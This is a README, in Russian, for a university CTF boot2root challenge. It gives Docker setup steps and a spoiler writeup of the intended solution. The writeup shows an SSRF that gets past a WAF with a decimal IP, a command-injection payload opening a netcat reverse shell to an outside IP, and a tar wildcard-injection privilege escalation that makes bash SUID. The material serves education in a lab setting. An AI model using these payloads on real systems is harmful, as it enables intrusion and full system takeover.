# Phish-and-Chips | CTF Challenge

![Category: Web / Boot2Root](https://img.shields.io/badge/Category-Web%20%2F%20Boot2Root-blue?style=for-the-badge&logo=hackthebox&logoColor=white)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![Docker: Ready](https://img.shields.io/badge/Docker-Ready-success?style=for-the-badge&logo=docker&logoColor=white)
![Python: Flask](https://img.shields.io/badge/Python-Flask%20%2B%20Gunicorn-yellow?style=for-the-badge&logo=python&logoColor=white)

Авторская CTF-задача, эмулирующая взлом корпоративной инфраструктуры ИБ-компании.
Разработана в рамках 4 семестра проектного практикума в ИРИТ-РТФ УрФУ на направлении "Информационная безопасность".

---

## Описание задачи

> ИБ-стартап **PhishGuard Enterprise** выкатил публичную демо-версию своего нового ИИ-движка для анализа фишинговых 
> ссылок.
> В их недавнем пресс-релизе сказано: 
> _Наш продукт на 100% защищен от внешних угроз благодаря строгим политикам WAF и глубокой изоляции компонентов_.
>
> Но, как известно, даже самые лучшие системы могут иметь уязвимости.
> 
> Наша команда сомневается в компетенции их инженеров. Ваша задача — прорваться за периметр, в обход их "неуязвимой" 
> защиты, и полностью скомпрометировать систему.

**Цель:** Прочитать `/root/flag.txt`.   
**Формат флага:** `FLAG{...}`.

---

## Установка и запуск
Стенд полностью упакован в Docker. Поскольку задача является частью монорепозитория, для ее запуска выполните следующие шаги:

1. **Склонируйте основной репозиторий и перейдите в папку с задачей:**
   ```bash
   git clone https://github.com/Plekkkh/CTFTasks.git
   cd CTFTasks/Phish-and-Chips
   ```
2. **Настройте флаг (Обязательно):**   
   Создайте файл `.env` в текущей папке и поместите туда ваш флаг:
   ```bash
   echo "CTF_FLAG=FLAG{your_custom_flag_here}" > .env
   ```
3. **Запустите стенд:**
   ```bash
   docker-compose up -d --build
   ```
Сайт будет доступен по адресу `http://127.0.0.1` или по IP-адресу вашего сервера на порту 80.

--- 

## ⚠️ SPOILER ALERT (Авторское решение)
Ниже описан предполагаемый Kill Chain.   
**Не открывайте спойлер, если планируете решить таску самостоятельно!**
<details>
<summary><b>Нажмите, чтобы показать Writeup</b></summary>

### 1. **SSRF + WAF Bypass**
На странице `/demo` находится уязвимая форма анализа URL. 
WAF блокирует классические адреса локального хоста: `localhost`, `127.0.0.1`.
- **Обход:** Использование Decimal IP: `http://2130706433:5000/api/v2/analyze?target=`
для обращения к скрытому внутреннему микросервису.

### 2. **Blind OS Command Injection**
Внутренний сервис слепо передает ввод в `curl`. 
Из-за фильтрации символов (`;`, `&`, `|`, `\n`) классические техники не работают.
- **Обход:** Использование `$(...)` для выполнения команд. 
Пейлоад должен быть закодирован в URL-encode для передачи через SSRF.
- **Payload:** `http://127.0.0.1" $(nc -e /bin/sh 10.20.30.40 4444) "`

### 3. **Повышение привилегий**
Получив шелл `www-data`, обнаруживается Cron-задача рута:   
`tar -cf /backup/reports.tar *` в папке `/var/www/html/reports`.
- **Обход:** Создание файлов-аргументов для эксплуатации Tar Wildcard Injection:
  ```bash
  touch -- "--checkpoint=1"
  touch -- "--checkpoint-action=exec=sh shell.sh"
  echo "chmod +s /bin/bash" > shell.sh
  ```
Дожидаемся отработки Cron, запускаем `/bin/bash -p`, получаем рутовый шелл и читаем `/root/flag.txt`.
</details>

---

_Created for Educational Purposes. University Project at IRIT-RTF UrFU. 2026._
